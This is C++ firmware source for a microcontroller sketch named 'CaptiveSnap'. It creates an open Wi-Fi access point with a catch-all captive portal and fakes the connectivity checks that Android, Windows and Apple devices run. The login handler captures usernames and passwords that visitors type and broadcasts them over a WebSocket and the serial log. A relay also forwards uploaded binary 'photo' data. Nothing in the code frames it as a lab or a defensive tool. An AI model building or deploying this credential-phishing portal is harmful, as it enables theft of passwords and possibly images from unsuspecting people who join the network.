// ============================================================
//  Server request handlers
// ============================================================

void handleRoot() {
  server.send(200, "text/html", FPSTR(index_html));
}

void handleActivate() {
  server.send(200, "text/html", FPSTR(activate_html));
}

void handleView() {
  server.send(200, "text/html", FPSTR(view_html));
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");
  if (username.length() > 0) {
    String msg = "USER:" + username;
    if (password.length() > 0) {
      msg += " (password: " + password + ")";
    }
    webSocket.broadcastTXT(msg);
    Serial.println("[Captured] " + msg);
  }
  // Redirect to activation page
  server.sendHeader("Location", "/activate", true);
  server.send(302, "text/plain", "");
}

void handleSpoof() {
  // Respond with 200 OK to satisfy connectivity checks
  server.send(200, "text/plain", "OK");
}

void handleNotFound() {
  // Redirect all unknown paths to root (captive portal)
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

// ============================================================
//  WebSocket event handler
// ============================================================

void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
  switch (type) {
    case WStype_DISCONNECTED:
      Serial.printf("[WS] Client %u disconnected\n", num);
      break;
    case WStype_CONNECTED:
      Serial.printf("[WS] Client %u connected\n", num);
      break;
    case WStype_TEXT:
      // Forward text to all clients (broadcast)
      webSocket.broadcastTXT(payload, length);
      Serial.printf("[WS] Text: %s\n", (char*)payload);
      break;
    case WStype_BIN:
      // Forward binary (photo) to all clients
      webSocket.broadcastBIN(payload, length);
      Serial.printf("[WS] Binary received, %u bytes\n", length);
      break;
    default:
      break;
  }
}

// ============================================================
//  Setup & loop
// ============================================================

void setup() {
  Serial.begin(115200);
  Serial.println("\n\n--- CaptiveSnap starting ---");

  // Configure Access Point
  IPAddress apIP(AP_IP_ADDR);
  IPAddress subnet(AP_SUBNET);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, subnet);
  WiFi.softAP(AP_SSID);  // open network

  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS (captive portal)
  dnsServer.start(53, "*", apIP);

  // Start HTTP server
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/activate", HTTP_GET, handleActivate);
  server.on("/view", HTTP_GET, handleView);
  // Spoof connectivity checks
  server.on("/generate_204", HTTP_GET, handleSpoof);
  server.on("/ncsi.txt", HTTP_GET, handleSpoof);
  server.on("/hotspot-detect.html", HTTP_GET, handleSpoof);
  server.on("/connecttest.txt", HTTP_GET, handleSpoof);
  server.onNotFound(handleNotFound);
  server.begin();
  Serial.println("HTTP server started on port 80");

  // Start WebSocket server
  webSocket.begin();
  webSocket.onEvent(webSocketEvent);
  Serial.println("WebSocket server started on port 81");

  Serial.println("CaptiveSnap ready! SSID: " + String(AP_SSID));
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  webSocket.loop();
}
